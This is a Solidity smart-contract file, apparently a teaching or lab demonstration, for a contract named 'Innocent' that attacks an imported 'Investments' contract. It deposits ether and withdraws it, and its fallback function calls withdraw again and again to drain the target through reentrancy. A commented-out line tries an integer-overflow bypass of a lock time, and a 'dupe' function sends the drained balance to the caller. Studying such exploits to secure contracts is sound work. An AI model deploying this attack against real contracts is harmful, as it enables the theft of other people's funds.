pragma solidity >=0.4.22 <0.7.0;
import "./Investments.sol";

contract Innocent {
    Investments public investments;
    event ValueReceived(address user, uint amount);
    
    constructor(address payable _address) public {
        investments = Investments(_address);
    }
 
    function pretendToInvest() public payable {
        require(msg.value >= 1 ether, "Invest atleast 1 ether");
        investments.invest.value(msg.value)();
        // investments.invest{value:msg.value}();
        // investments._lockTime(msg.sender, (2 ** 255) - getLockTime());
        investments.withdraw();
    }
    
     function dupe() public {
      msg.sender.transfer(address(this).balance);
    }
    
    function getLockTime() public view returns (uint) {
        return investments.checkLockTime();
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
      // When a withdrawal is initiated from Investments, this fallback function 
      // is triggered and continues to withdraw from Investments
    fallback() external payable {
      if (address(investments).balance != 0) {
          investments.withdraw();
      }
    }
    
    receive() external payable {
         emit ValueReceived(msg.sender, msg.value);
    }
}